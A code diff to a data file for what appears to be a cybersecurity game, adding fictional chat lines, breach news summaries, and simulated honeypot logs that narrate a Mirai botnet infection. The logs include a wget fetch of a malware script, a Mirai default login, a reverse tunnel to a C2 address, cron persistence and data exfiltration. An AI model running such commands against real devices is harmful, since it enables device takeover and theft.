@@ -97,8 +97,9 @@ export const user_messages: UserChats[] = [
   {
     chat_with_id: 1,
     message_thread: [
-      { from_id: 1, content: "Make sure it gets done." },
-      { from_id: 0, content: "It will." },
+      { from_id: 1, content: "There is not a lot to be doing right now. But DDoS attacks seem to be a rising issue." },
+      { from_id: 1, content: "Based on Alison's lecture, I think researching that area might be smart." },
+      { from_id: 0, content: "I'm on it. Currently in contact with her. She has sent me an email." },
     ],
   },
 ];
@@ -119,10 +120,40 @@ export const honey_pot_logs: string[] = [
   "[13:02:58] [TELNET] Session closed by remote 185.244.25.4",
 
   "[13:03:02] [SSH] 450 brute-force attempts blocked from 142.250.72.238",
-  "[13:03:45] [MIRAI] Binary signature match: /bin/busybox detected",
+  "[13:03:21] [TELNET] vDOS-style login attempt from 156.146.56.9 - user: root / pass: root",
+  "[13:03:29] [SCRIPT] Detected post-auth script execution attempt: /bin/wget http://vdos[.]xyz/malware.sh",
+  "[13:03:35] [MIRAI] Binary overwrite attempt detected - /bin/sadDVR",
+  "[13:03:38] [vDOS] Malware uninstall triggered: removing existing Mirai instance",
+  "[13:03:42] [MIRAI] Retaliation payload: Mirai re-flashing /tmp/sadDVR",
+  "[13:03:45] [MIRAI] Binary signature match: /bin/sadDVR detected",
   "[13:04:09] [SCAN] Port scan from 94.102.49.189 - 1000 ports hit in 0.47s",
+
   "[+] No successful intrusions detected. System integrity: INTACT.",
 ];
+
+export const alaskan_logs: string[] = [
+  "[+] Launching Watchtower v3.2.1",
+  "[+] Mode: Honeypot Monitoring",
+  "[+] Loading Mirai & IoT attack signatures... done.",
+  "[+] Tracking inbound traffic on ports 22, 23, 80, 443, 8080...",
+
+  "[14:07:12] [TELNET] Login attempt root/xc3511 from 198.51.100.22",
+  "[14:07:15] [DEVICE] Fingerprint: TBK DVR‑4104 (ARM32 architecture)",
+  "[14:07:18] [HTTP] Malicious POST to /device.rsp opt=sys cmd=… shell payload delivered",
+  "[14:07:19] [MALWARE] ARM32 binary 'arm7' downloaded from 42.112.26.36 and executed",
+  "[14:07:22] [MIRAI] Variant launched with RC4 string decryption and anti‑VM checks",
+  "[14:07:25] [BACKCONNECT] Reverse tunnel initiated to C2 at 203.0.113.8:4444",
+  "[14:07:29] [C2] BackConnect-hosted server responding — heartbeat acknowledged",
+  "[14:07:33] [PERSISTENCE] Cronjob scheduled: '@reboot /tmp/arm7' for stealth persistence",
+  "[14:07:38] [SCAN] Outbound port scan across 192.168.0.0/16 targeting port 5555",
+  "[14:07:43] [PROXY] SOCKS5 tunnel confirmed over port 9050 (possible Tor fallback)",
+  "[14:07:47] [EXFIL] Configs and logs uploaded via HTTP POST to 185.84.81.194",
+  "[14:07:52] [C2] Heartbeat ping to BackConnect C2 remains stable — session alive",
+  "[14:08:00] [+] Device located in Alaska (Ketchikan hunting‑lodge DVR), now fully botnet‑enrolled.",
+  
+  "[+] Mirai variant in use reflects code lineage described in WIRED feature on the teenage Mirai authors and their ties to BackConnect infrastructure"  
+];
+
 
 // --------------------------------------------------------------
 // ----- FORUM --------------------------------------------------
@@ -339,76 +370,57 @@ export interface NewsPostInterface {
 export const newsPosts: NewsPostInterface[] = [
   {
     id: 0,
-    title: "Breaking News: Major Event in Australia",
+    title: "Breaking: Qantas Data Breach Hits ~6 Million Customers",
     summary:
-      "This is a summary of the latest breaking news story happening in Australia today. Stay tuned for updates.",
-    author: "",
-    content: "",
+      "Personal information from nearly six million Qantas customers compromised after social‑engineering attack on third‑party call centre platform.",
+    author: "The Guardian / FT",
+    content:
+      `In late June 2025, Qantas revealed that up to 6 million customers’ data—including names, birthdates, email addresses, phone numbers and frequent flyer details—was breached via a third‑party customer service platform. Financial data remained secure. The FBI‑flagged Scattered Spider group, known for voice‑phishing (“vishing”) attacks, is suspected to be behind the compromise. Qantas responded by notifying users and pledging remediation steps. The incident spotlights the growing risk posed by outsourced systems in complex supply chains.`, 
     breaking: true,
   },
   {
     id: 1,
-    title: "Local News: City Council Updates",
-    summary: "Details about the latest decisions by the city council.",
-    author: "",
-    content: "",
-    breaking: false,
-  },
-  {
-    id: 2,
-    title: "Sports: Big Win for Local Team",
-    summary: "Highlights from yesterday's thrilling game.",
-    author: "",
-    content: "",
-    breaking: false,
-  },
-  {
-    id: 3,
-    title: "Culture: New Exhibition Opens",
-    summary: "A new art exhibition has opened downtown.",
-    author: "",
-    content: "",
-    breaking: false,
-  },
-];
-
-export const newsRotation1: NewsPostInterface[] = [
-  {
-    id: 0,
-    title: "Breaking News: Brian Krebs",
+    title: "NSW Government Departments Exposed by Legacy IT Systems",
     summary:
-      "This is a summary of the latest breaking news story happening in Australia today. Stay tuned for updates.",
-    author: "",
-    content: "",
-    breaking: true,
-  },
-  {
-    id: 1,
-    title: "Local News: City Council Updates",
-    summary: "Details about the latest decisions by the city council.",
-    author: "",
-    content: "",
+      "An audit finds most NSW agencies are using outdated computer systems dating back to 2008—opening the door to cyber‑intrusions.",
+    author: "Daily Telegraph / ACSC",
+    content:
+      `A recent whistleblower‑led audit revealed 69% of NSW government agencies lack basic cybersecurity protections and rely on systems not updated since 2008. The Auditor‑General flagged 152 significant vulnerabilities spread across 27 departments. The state government has pledged AUD 87.7 million over four years to upgrade digital protections and enforce stronger compliance.`, 
     breaking: false,
   },
   {
     id: 2,
-    title: "Sports: Big Win for Local Team",
-    summary: "Highlights from yesterday's thrilling game.",
-    author: "",
-    content: "",
+    title: "Brisbane Entertainment Centre Cyberattack Targets Staff Data",
+    summary:
+      "Operator ASM Global confirms unauthorized access and theft of staff records from the venue’s internal systems.",
+    author: "Courier‑Mail / ASM Global",
+    content:
+      `In June 2025, the Brisbane Entertainment Centre experienced a cyberattack that exposed documents related to former and current staff, including onboarding and contact information. ASM Global, which runs the venue, notified impacted employees and teamed up with the Australian Cyber Security Centre and the OAIC to investigate. Affected staff were offered 12 months of credit‑monitoring and antivirus services.`, 
     breaking: false,
   },
   {
     id: 3,
-    title: "Culture: New Exhibition Opens",
-    summary: "A new art exhibition has opened downtown.",
-    author: "",
-    content: "",
+    title: "Massive SharePoint Zero‑Day Exploit Hits US Organsations",
+    summary:
+      "Chinese‑linked threat actors breach nearly 100 global systems via unpatched Microsoft SharePoint servers.",
+    author: "Politico / Microsoft",
+    content:
+      `A critical zero‑day vulnerability in on‑premises Microsoft SharePoint software has been exploited by groups linked to China—Violet Typhoon, Linen Typhoon, and Storm‑2603—to breach approximately 100 organisations, including multiple U.S. federal agencies. Microsoft and federal cybersecurity teams are working to contain the incident; cloud‑hosted SharePoint was unaffected.`, 
+    breaking: false,
+  },
+  {
+    id: 4,
+    title: "Data Hack Impacts Louis Vuitton Customers in Australia",
+    summary:
+      "Sensitive personal data including passport numbers leaked in international breach involving Australian customers.",
+    author: "Herald Sun",
+    content:
+      `Australian customers of Louis Vuitton are among those affected by a global data leak. Exposed data includes names, dates of birth, email addresses, phone numbers and passport numbers. Cybersecurity expert Dr Shaanan Cohney attributes the surge in breaches to poorly secured cloud services. He advises adopting strong, unique passwords, biometric logins, and avoiding SMS‑based two‑factor authentication.`, 
     breaking: false,
   },
 ];
 
-export const newsRotation2: NewsPostInterface[] = [
+export const newsRotation: NewsPostInterface[] = [
   {
     id: 0,
     title: "Breaking News: Brian Krebs",
